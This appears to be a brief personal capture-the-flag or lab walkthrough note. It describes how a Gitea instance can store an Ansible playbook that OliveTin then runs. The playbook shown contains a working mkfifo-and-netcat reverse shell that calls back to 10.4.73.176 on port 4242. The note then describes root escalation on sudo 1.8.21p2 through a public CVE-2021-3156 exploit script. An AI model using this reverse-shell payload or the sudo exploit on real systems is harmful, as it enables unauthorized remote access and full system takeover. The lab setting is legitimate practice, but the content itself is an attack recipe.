Don't download from > open image in new tab > wget http://....../

git tea and oliveTin.

Git tea can save ansible yaml file. OliveTin can run Ansible yaml files.
If the code in yaml file has reverse shell, we can get reverse shell by running from OliveTin.

Like that
----------
    - name: get the username running the deploy
      become: false
      command: whoami
      register: username_on_the_host
      changed_when: false

    - debug: var=username_on_the_host

    - name: Test
      shell: rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.73.176 4242 >/tmp/f


Privilege escalation from linpeas.sh
-------------------------------------

sudo 1.8.21p2 version has vulnerability > CVE-2021-3156
https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py

By running exploit_nss.py in target > get root access immediatelly.
